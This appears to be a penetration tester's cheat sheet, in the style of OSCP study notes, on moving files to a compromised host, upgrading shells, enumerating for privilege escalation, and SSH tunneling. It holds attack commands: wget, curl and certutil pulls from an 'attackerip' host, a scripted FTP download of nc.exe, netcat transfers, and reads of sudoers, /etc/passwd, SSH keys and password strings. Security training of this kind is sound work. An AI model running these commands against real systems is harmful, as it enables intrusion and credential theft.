## File transfers

### HTTP

Two options:

1. Use SimpleHTTPServer to serve files from the current directory:

```Python -m SimpleHTTPServer 80```

2. Use Apache to create a webserver on the attacking machine (var/www/html)

```systemctl start Apache2```

Pull files on target machine: 

```wget http://attackerip/file```

```curl http://attackerip/file > file``` 

Windows:  ```certutil -urlcache -f http://sourceip/file.exe [c:\desired_destination\desired_]name.exe```

### FTP

   Create an FTP server in the directory you are in, on port 21, allow anonymous access:
   
   ```Python -m pyftpdlib 21```
   
   Connect with:
   
   ```ftp $IPaddressofattacker```
   
   Can be made non-interactive by providing the ftp.exe with a text file containing the commands to be executed

   Use the following via remote shell to download

  ```Echo open 10.11.0.5 21 >> ftp.txt```

  ```Echo USER offsec>> ftp.txt```

  ```Echo ftp>> ftp.txt```

  ```Echo bin>> ftp.txt```

  ```Echo GET nc.exe >> ftp.txt```

  ```Echo bye >> ftp.txt```

  ```ftp -v -n -s:ftp.txt```
  
  ### Netcat

   On receiving machine: ```nc -nlvp 4444 > incoming.exe```

   On sending machine: ```nc – nv 10.11.23.33 4444 < file.exe```
   
  ### Meterpreter
  
   Upload/download feature  

## Upgrading to TTY shell (Linux)

First, run: ```python -c "import pty; pty.spawn('/bin/bash')"```

Be sure to check for other versions of Python!

### Enable auto tab

Background the process using ```Ctl + Z```

Enter ```stty raw -echo```

Foreground the process using ```fg```

## Privilege escalation

  Linux example: CVE 2012-0056

  Windows example: MS11-080
  
### Linux

Enumerate
   
   - What are your current permissions?
   
   ```whoami```
   
   ```hostname```
   
   ```uname -a```
   
   ```uname -r``` Kernel version
      
   ```env```
      
   ```history```
    
   ```pwd```
      
   - Are you in the sudoers file?  Can you sudo anything without a pw?
   
   ```sudo -l```
      
   ```cat etc/sudoers```
      
   - Who else is has/is logged in?
   
   ```who```
   
   ```w```
      
   ```last```
      
   - Gather network info
   
   ```ifconfig -a```
      
   ```netstat```
      
   ```lsof -i```
      
   - Services/software
   
   ```ps aux```
      
   ```ps -ef```
      
   - list versions
         
   ```dpkg -l```
         
   ```httpd -v```
         
   ```mysql --version```
         
   ```python --version```
         
   ```ruby -v```
         
   - Interesting files to review
   
      SUID ```find / -perm -u=s -type f 2>/dev/null```
   
   ```cat etc/passwd```
      
   - files that run as root
      
   - chron jobs
      
   ```ls -la /etc/cron*```
      
      - SSH keys
      
   ```ls -la ~/.ssh/```

   - Linux version info:

```uname -ar```
```cat /etc/issue```
```cat /etc/*-release```
```cat /etc/lsb-release``` Debian-based machines
```cat /etc/redhat-release``` Redhat-based machines

Upload and run LinEnum.sh (Documents/Tools)

Use searchsploit to look for kernel or software vulnerabilities

Use any passwords found to attempt to become root by using: ```sudo su```

Refer to gotmilk's article:  https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

### Windows

List users: ```net users```

Show current user: ```whoami```

Find password strings

```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /spin “password” *.*
findstr /spin “password” *.*
```

Show Windows version: ```systeminfo | findstr /B /C:"OS Name" /C:"OS Version"```

Look for know exploits in current Windows versions

```systeminfo | findstr /B/C:"OS Name" /C:"OS Version"```

Refer to absolomb's article:  https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

#### XP/2003

Look for programs in the dock running as SYSTEM 

Click to open file dialogue.  Find cmd.exe and open; you'll get a cmd prompt as SYSTEM.

Shatter attacks.  (research and fill in)

#### Windows 7

Incorrect permission, i.e. programs giving full write privileges to all users.  You can then modify files in the directory to execute malicious code.

## Tunneling

### SSH tunneling 

   Local port forwarding 

```ssh <gateway> -L <local port to listen>:<remote host>:<remote port>```

   Remote port forwarding

```ssh <gateway> -R <remote port to bind>:<local host>:<local port>```

   Dynamic port forwarding 

```ssh -D <local proxy port> -p <remote port> <target>```

   HTTP tunneling – technique to encapsulate a protocol within HTTP

      HTTPTunnel or stunnel 

